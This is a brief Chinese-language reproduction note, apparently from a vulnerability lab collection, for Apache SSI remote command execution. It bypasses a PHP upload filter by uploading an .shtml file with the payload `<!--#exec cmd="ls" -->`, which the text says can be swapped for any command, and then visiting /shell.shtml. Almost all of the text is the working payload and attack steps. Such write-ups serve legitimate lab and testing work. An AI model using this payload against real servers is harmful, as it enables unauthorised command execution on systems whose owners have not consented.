Apache-SSI-RCE
在测试任意⽂件上传漏洞的时候，⽬标服务端可能不允许上传php后缀的⽂件。如果⽬标服务器开启了SSI与CGI⽀
持，我们可以上传⼀个shtml⽂件，并利⽤ `<!--#exec cmd="id" -->` 语法执⾏任意命令。
漏洞复现

访问 `/upload.php`


尝试上传php⽂件，失败
上传⼀个shtml⽂件

```
<!--#exec cmd="ls" -->
```

可以将ls替换为想要执⾏的命令
访问 `/shell.shtml`
